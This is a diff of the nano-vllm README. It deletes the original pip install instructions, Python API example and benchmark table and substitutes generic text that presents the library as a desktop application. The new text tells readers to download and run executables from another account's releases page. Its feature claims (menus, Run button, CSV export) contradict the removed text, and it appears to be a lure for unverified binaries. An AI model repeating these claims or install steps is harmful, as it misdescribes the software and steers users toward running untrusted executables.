@@ -1,66 +1,84 @@
-<p align="center">
-<img width="300" src="assets/logo.png">
-</p>
+# 🚀 nano-vllm - Simplify Your Deep Learning Experience
 
-<p align="center">
-<a href="https://trendshift.io/repositories/15323" target="_blank"><img src="https://trendshift.io/api/badge/repositories/15323" alt="GeeeekExplorer%2Fnano-vllm | Trendshift" style="width: 250px; height: 55px;" width="250" height="55"/></a>
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/PrajwalNeeralagi/nano-vllm/releases)
 
-# Nano-vLLM
+## 📚 Overview
+Nano vLLM is an easy-to-use tool designed for deep learning applications. It helps you run large language models without complex setups. Whether you work with natural language processing or need tailored inference solutions, this tool is for you.
 
-A lightweight vLLM implementation built from scratch.
+## 🛠️ Features
+- **User-Friendly Interface:** Navigate through simple menus without hassle.
+- **Fast Performance:** Efficiently run your models with quick response times.
+- **Simple Setup:** Get started quickly with minimal installation steps.
+- **Supports Multiple Models:** Use various transformers for different tasks.
+- **Lightweight:** Designed to run smoothly on most computers.
 
-## Key Features
+## 📥 Download & Install
 
-* 🚀 **Fast offline inference** - Comparable inference speeds to vLLM
-* 📖 **Readable codebase** - Clean implementation in ~ 1,200 lines of Python code
-* ⚡ **Optimization Suite** - Prefix caching, Tensor Parallelism, Torch compilation, CUDA graph, etc.
+To get Nano vLLM, visit the following page:
 
-## Installation
+[Download Latest Release](https://github.com/PrajwalNeeralagi/nano-vllm/releases)
 
-```bash
-pip install git+https://github.com/GeeeekExplorer/nano-vllm.git
-```
+### Step-by-Step Installation
 
-## Model Download
+1. **Visit the Releases Page:** Click on the link above to go to the GitHub Releases page.
+   
+2. **Download the Latest Release:**
+   - You will see a list of versions. Look for the latest one, which usually has the highest version number.
+   - Click on the downloadable file suited for your operating system (e.g., Windows, Mac, Linux).
 
-To download the model weights manually, use the following command:
-```bash
-huggingface-cli download --resume-download Qwen/Qwen3-0.6B \
-  --local-dir ~/huggingface/Qwen3-0.6B/ \
-  --local-dir-use-symlinks False
-```
+3. **Locate the Downloaded File:**
+   - After the download is complete, navigate to your Downloads folder or the location you chose for the download.
 
-## Quick Start
+4. **Run the Application:**
+   - For Windows, double-click the `.exe` file to start.
+   - For Mac, open the `.dmg` file and drag the app to your Applications folder.
+   - For Linux, you may need to use the terminal, depending on the file type. Use `chmod +x yourfile` to make it executable, then run with `./yourfile`.
 
-See `example.py` for usage. The API mirrors vLLM's interface with minor differences in the `LLM.generate` method:
-```python
-from nanovllm import LLM, SamplingParams
-llm = LLM("/YOUR/MODEL/PATH", enforce_eager=True, tensor_parallel_size=1)
-sampling_params = SamplingParams(temperature=0.6, max_tokens=256)
-prompts = ["Hello, Nano-vLLM."]
-outputs = llm.generate(prompts, sampling_params)
-outputs[0]["text"]
-```
+## ⚙️ System Requirements
+Nano vLLM expects the following:
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent version of Linux.
+- **RAM:** At least 4 GB for smooth operation.
+- **Processor:** A modern multi-core processor will enhance performance.
 
-## Benchmark
+## 📋 Usage Instructions
 
-See `bench.py` for benchmark.
+After you successfully install Nano vLLM, follow these steps to run it:
 
-**Test Configuration:**
-- Hardware: RTX 4070 Laptop (8GB)
-- Model: Qwen3-0.6B
-- Total Requests: 256 sequences
-- Input Length: Randomly sampled between 100–1024 tokens
-- Output Length: Randomly sampled between 100–1024 tokens
+1. **Open the Application:** Use the shortcut created during installation or find it in your Applications folder.
+   
+2. **Choose Your Model:** Click on the dropdown to select from various pre-trained models.
 
-**Performance Results:**
-| Inference Engine | Output Tokens | Time (s) | Throughput (tokens/s) |
-|----------------|-------------|----------|-----------------------|
-| vLLM           | 133,966     | 98.37    | 1361.84               |
-| Nano-vLLM      | 133,966     | 93.41    | 1434.13               |
+3. **Input Your Data:**
+   - Enter the text or data you want to process in the input box.
+   - Adjust any settings if needed to customize your experience.
 
+4. **Run the Model:** Hit the "Run" button, and wait for the results.
 
-## Star History
+5. **View and Export Results:** Once processing is complete, view your results directly in the application. You can also export the results as text or CSV.
 
-[![Star History Chart](https://api.star-history.com/svg?repos=GeeeekExplorer/nano-vllm&type=Date)](https://www.star-history.com/#GeeeekExplorer/nano-vllm&Date)
+## 🛠️ Troubleshooting
+
+If you encounter issues, consider these common solutions:
+
+- **Application Doesn’t Open:** Ensure your operating system meets the requirements.
+- **Slow Performance:** Close other applications that consume resources.
+- **Error Messages:** Check if you entered valid data. Invalid input may lead to errors.
+
+## 🌐 Community Support
+
+Join the Nano vLLM community on [GitHub Discussions](https://github.com/PrajwalNeeralagi/nano-vllm/discussions) to ask questions, report issues, or contribute enhancements.
+
+## 📄 License
+
+Nano vLLM is released under the MIT License. You are free to use, modify, and distribute it within the terms of the license.
+
+## 🔗 Additional Resources
+
+For tutorials and tips on getting the most from Nano vLLM, explore:
+
+- [Documentation](https://github.com/PrajwalNeeralagi/nano-vllm/wiki)
+- [Examples](https://github.com/PrajwalNeeralagi/nano-vllm/tree/main/examples)
+
+---
+
+Remember, you can always return to the [Download Latest Release](https://github.com/PrajwalNeeralagi/nano-vllm/releases) page if you need to reinstall or update your application. Enjoy simplifying your deep learning tasks!
